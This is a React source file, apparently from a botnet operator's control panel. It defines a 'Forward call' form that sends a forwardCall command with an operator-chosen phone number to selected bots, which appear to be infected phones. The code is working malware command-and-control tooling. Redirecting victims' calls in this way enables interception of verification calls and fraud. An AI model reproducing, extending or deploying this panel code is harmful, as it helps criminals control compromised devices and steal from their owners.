import React from 'react';
import SettingsContext from '../../Settings';


//Переардесация звонка - {"this":"~command~","name":"forwardCall","number":"+123456789"}
class ForwardCall extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          phone: ''
        }
    }

    onChangePhone = (e) => {
        this.setState({ 
            phone: e.target.value.substring(0,40)
        });
    }

    onClickForwardCall = (e) => {
        if(SettingsContext.BotsSelected()) {
            SettingsContext.BotSendCommand('{"name":"forwardCall","number":"' + this.state.phone + '"}');
            this.setState({ 
                phone: ''
            });
            SettingsContext.ShowToastTitle("info", "Forward Call", "Please wait while the bots confirm the command");
        }
    }

    render () {
        return (
            <React.Fragment>
                <div class="card animated fadeIn">
                <div class="card-body">
                    <h5 class="card-title">Forward call</h5>
                    <h6 class="card-subtitle mb-2 text-muted">Forward call on selected bots</h6>
                    <p class="card-text">
                        <input class="form-control" value={this.state.phone} onChange={this.onChangePhone} placeholder="Phone number +1..." />
                    </p>
                    <button type="button" onClick={this.onClickForwardCall} class="btn btn-right btn-outline-success">Forward calls</button>
                </div>
                </div>
            </React.Fragment>
        );
    }
}

export default ForwardCall;